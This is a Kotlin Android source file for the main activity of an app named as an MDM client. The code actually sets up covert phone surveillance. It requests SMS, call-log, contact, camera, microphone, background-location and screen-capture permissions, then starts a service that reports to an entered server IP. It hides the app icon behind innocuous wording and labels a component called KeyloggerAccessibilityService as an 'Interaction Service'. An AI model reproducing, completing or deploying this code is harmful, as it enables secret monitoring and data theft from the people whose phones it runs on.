package com.mdm.client

import android.Manifest
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.mdm.client.config.AppConfig
import com.mdm.client.databinding.ActivityMainBinding
import com.mdm.client.keylogger.KeyloggerAccessibilityService
import com.mdm.client.service.MdmForegroundService
import com.mdm.client.util.NetworkUtils

class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding

    private val dangerousPermissions = buildList {
        add(Manifest.permission.ACCESS_FINE_LOCATION)
        add(Manifest.permission.ACCESS_COARSE_LOCATION)
        add(Manifest.permission.READ_SMS)
        add(Manifest.permission.SEND_SMS)
        add(Manifest.permission.READ_CONTACTS)
        add(Manifest.permission.READ_CALL_LOG)
        add(Manifest.permission.CALL_PHONE)
        add(Manifest.permission.CAMERA)
        add(Manifest.permission.RECORD_AUDIO)
        add(Manifest.permission.READ_PHONE_STATE)
        if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.S_V2) {
            add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            add(Manifest.permission.BLUETOOTH_CONNECT)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            add(Manifest.permission.POST_NOTIFICATIONS)
        }
    }.toTypedArray()

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { results ->
        val denied = results.filterValues { !it }.keys
        if (denied.isNotEmpty()) {
            Toast.makeText(this, "Some permissions denied: $denied", Toast.LENGTH_LONG).show()
        }
        requestBackgroundLocation()
    }

    private val backgroundLocationLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) {
        requestMediaProjection()
    }

    private val mediaProjectionLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == RESULT_OK && result.data != null) {
            AppConfig.mediaProjectionResultCode = result.resultCode
            AppConfig.mediaProjectionData = result.data
            updateStatus("MediaProjection granted")
        } else {
            updateStatus("MediaProjection denied — VNC and screenshot disabled")
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        // Show current config
        binding.etServerIp.setText(AppConfig.getServerIp(this))
        binding.tvDeviceId.text = "Device ID: ${AppConfig.getDeviceId(this)}\nDevice IP: ${NetworkUtils.getLocalIpAddress(this)}"

        binding.btnSave.setOnClickListener {
            val ip = binding.etServerIp.text.toString().trim()
            if (ip.isBlank()) {
                Toast.makeText(this, "Enter server IP", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            AppConfig.setServerIp(this, ip)
            startMdmService()
            updateStatus("Service started — connecting to $ip")

            AlertDialog.Builder(this)
                .setTitle("Configuration Complete")
                .setMessage("System services are now active. Minimize app visibility?")
                .setPositiveButton("Yes") { _, _ ->
                    hideAppIcon()
                    AppConfig.setSetupComplete(this, true)
                    Toast.makeText(this, "Configuration saved.", Toast.LENGTH_SHORT).show()
                    finish()
                }
                .setNegativeButton("No") { _, _ ->
                    AppConfig.setSetupComplete(this, true)
                }
                .setCancelable(false)
                .show()
        }

        binding.btnAccessibility.setOnClickListener {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        }

        binding.btnUsageStats.setOnClickListener {
            startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
        }

        if (AppConfig.isSetupComplete(this) && AppConfig.isConfigured(this)) {
            startMdmService()
        }

        // Kick off permission flow
        requestAllPermissions()
        promptDisableBatteryOptimization()
    }

    private fun requestAllPermissions() {
        val missing = dangerousPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (missing.isNotEmpty()) {
            permissionLauncher.launch(missing.toTypedArray())
        } else {
            requestBackgroundLocation()
        }
    }

    private fun requestBackgroundLocation() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
            != PackageManager.PERMISSION_GRANTED
        ) {
            AlertDialog.Builder(this)
                .setTitle("Location Access")
                .setMessage("Allow location access all the time for full device management functionality.")
                .setPositiveButton("Allow") { _, _ ->
                    backgroundLocationLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                }
                .setNegativeButton("Skip") { _, _ -> requestMediaProjection() }
                .show()
        } else {
            requestMediaProjection()
        }
    }

    private fun requestMediaProjection() {
        if (AppConfig.mediaProjectionData == null) {
            val mpManager = getSystemService(MediaProjectionManager::class.java)
            mediaProjectionLauncher.launch(mpManager.createScreenCaptureIntent())
        }
    }

    private fun promptDisableBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(PowerManager::class.java)
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                try {
                    startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                        data = Uri.parse("package:$packageName")
                    })
                } catch (_: Exception) {}
            }
        }
    }

    private fun hideAppIcon() {
        packageManager.setComponentEnabledSetting(
            ComponentName(this, "$packageName.LauncherAlias"),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }

    fun showAppIcon() {
        packageManager.setComponentEnabledSetting(
            ComponentName(this, "$packageName.LauncherAlias"),
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
            PackageManager.DONT_KILL_APP
        )
    }

    private fun startMdmService() {
        val intent = Intent(this, MdmForegroundService::class.java)
        ContextCompat.startForegroundService(this, intent)
    }

    private fun updateStatus(msg: String) {
        binding.tvStatus.text = "Status: $msg"
    }

    override fun onResume() {
        super.onResume()
        val accessible = KeyloggerAccessibilityService.isEnabled(this)
        binding.btnAccessibility.text = if (accessible)
            "Interaction Service: ENABLED" else "Enable Interaction Service"
    }
}
